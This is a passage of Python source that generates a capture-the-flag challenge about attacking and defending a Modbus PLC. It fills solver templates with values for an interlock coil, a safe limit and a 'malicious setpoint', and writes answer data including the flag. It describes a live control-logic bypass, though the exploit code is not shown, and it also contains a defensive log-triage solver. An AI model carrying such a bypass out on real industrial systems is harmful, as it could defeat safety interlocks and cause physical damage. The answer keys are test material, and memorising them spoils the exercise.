    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--mode", choices=["live", "log"], default="__DEFAULT_MODE__")
    parser.add_argument(
        "--log-path",
        default="public/evidence/register_write_log.jsonl",
        help="path to the register-write log (blue/log mode)",
    )
    args = parser.parse_args()

    if args.mode == "live":
        flag = solve_live(args.host)
    else:
        flag = solve_from_log(Path(args.log_path))
    print(flag)
    return 0


if __name__ == "__main__":
    sys.exit(main())
'''


# --- private/solver.py (blue-only variant: no offensive/live-exploit code) -------
#
# Blue mode ships a distinct, defensive-only solver: it never speaks Modbus/TCP
# to the live plc, and has no ModbusClient class at all -- it is an
# incident-responder's log-triage script, not an attacker's exploit script.

_BLUE_SOLVER_TEMPLATE = '''from __future__ import annotations

import argparse
import json
import sys
from pathlib import Path

# Generated per-instance layout.
ENGINEER_SUBNET_PREFIX = "__ENGINEER_SUBNET_PREFIX__"
ATTACKER_PREFIX = "__ATTACKER_PREFIX__"


def solve_from_log(log_path: Path) -> str:
    """Incident-response triage: find the anomalous read-with-payload event.

    The anomaly is a Modbus session with no engineering-workstation session
    (``session: none``) whose source address falls outside the engineering
    subnet -- the same signature a defender would flag by hand.
    """
    for line in log_path.read_text(encoding="utf-8").splitlines():
        if not line.strip():
            continue
        event = json.loads(line)
        if event.get("session") == "none" and event.get("src_ip", "").startswith(ATTACKER_PREFIX):
            payload = event.get("response_payload")
            if payload:
                return payload
    raise RuntimeError("anomalous read-with-payload event not found in log")


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Incident-response triage script: no live PLC exploitation.",
    )
    parser.add_argument(
        "--log-path",
        default="public/evidence/register_write_log.jsonl",
        help="path to the register-write log",
    )
    args = parser.parse_args()

    flag = solve_from_log(Path(args.log_path))
    print(flag)
    return 0


if __name__ == "__main__":
    sys.exit(main())
'''


def _blue_solver(v: Variant) -> str:
    attacker_prefix = v.attacker_ip.rsplit(".", 1)[0] + "."
    text = _BLUE_SOLVER_TEMPLATE
    text = text.replace(
        "__ENGINEER_SUBNET_PREFIX__", v.engineer_subnet.split("/")[0].rsplit(".", 1)[0] + "."
    )
    text = text.replace("__ATTACKER_PREFIX__", attacker_prefix)
    return text


def _solver(v: Variant, spec: ChallengeSpec) -> str:
    if spec.mode == "blue":
        return _blue_solver(v)
    # red and purple both solve live: the public evidence log is flag-redacted
    # for these modes (only blue is handed the flag-bearing log), so the
    # canonical solve is the live control-logic bypass, not a log read.
    default_mode = "live"
    attacker_prefix = v.attacker_ip.rsplit(".", 1)[0] + "."
    text = _SOLVER_TEMPLATE
    text = text.replace("__PLC_PORT__", str(v.plc_port))
    text = text.replace("__UNIT_ID__", str(v.unit_id))
    text = text.replace("__INTERLOCK_COIL__", str(v.interlock_coil))
    text = text.replace("__SETPOINT_REG__", str(v.setpoint_reg))
    text = text.replace("__SAFE_LIMIT__", str(v.safe_limit))
    text = text.replace("__MALICIOUS_SETPOINT__", str(v.malicious_setpoint))
    text = text.replace("__FLAG_REG_START__", str(v.flag_reg_start))
    text = text.replace("__FLAG_REG_COUNT__", str(v.flag_reg_count))
    text = text.replace("__ENGINEER_SUBNET_PREFIX__", v.engineer_subnet.split("/")[0].rsplit(".", 1)[0] + ".")
    text = text.replace("__ATTACKER_PREFIX__", attacker_prefix)
    text = text.replace("__DEFAULT_MODE__", default_mode)
    return text


# --- private/variant.json ---------------------------------------------------------


def _variant_json(spec: ChallengeSpec, v: Variant) -> str:
    return (
        json.dumps(
            {
                "meta": spec.meta_mapping(),
                "family": FAMILY_NAME,
                "mode": spec.mode,
                "routes": {
                    "plc_modbus_tcp": f"tcp://<host>:{v.plc_port}",
                    "hmi_status": f"http://<host>:{v.hmi_port}/api/status",
                    "hmi_notes": f"http://<host>:{v.hmi_port}/api/notes",
                    "evidence_log": "public/evidence/register_write_log.jsonl",
                },
                "creds": {
                    "hmi_operator_header": "X-Operator",
                    "hmi_operator_value": v.operator_name,
                },
                "ids": {
                    "unit_id": v.unit_id,
                    "interlock_coil": v.interlock_coil,
                    "setpoint_reg": v.setpoint_reg,
                    "flag_reg_start": v.flag_reg_start,
                    "flag_reg_count": v.flag_reg_count,
                    "safe_limit": v.safe_limit,
                    "malicious_setpoint": v.malicious_setpoint,
                    "engineer_subnet": v.engineer_subnet,
                    "engineer_ip": v.engineer_ip,
                    "attacker_ip": v.attacker_ip,
                    "plant_name": v.plant_name,
                },
                "flag": v.flag,
            },
            indent=2,
            sort_keys=True,
        )
        + "\n"
    )


# --- tests/healthcheck.py --------------------------------------------------------


def _healthcheck(v: Variant) -> str:
    return f'''from __future__ import annotations

import argparse
import json
import sys
from urllib import request


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--hmi-base-url", default="http://127.0.0.1:{v.hmi_port}")
    args = parser.parse_args()
    with request.urlopen(args.hmi_base_url.rstrip("/") + "/healthz", timeout=5) as response:
        body = json.loads(response.read().decode("utf-8"))
    assert body["ok"] is True
    return 0


if __name__ == "__main__":
    sys.exit(main())
'''
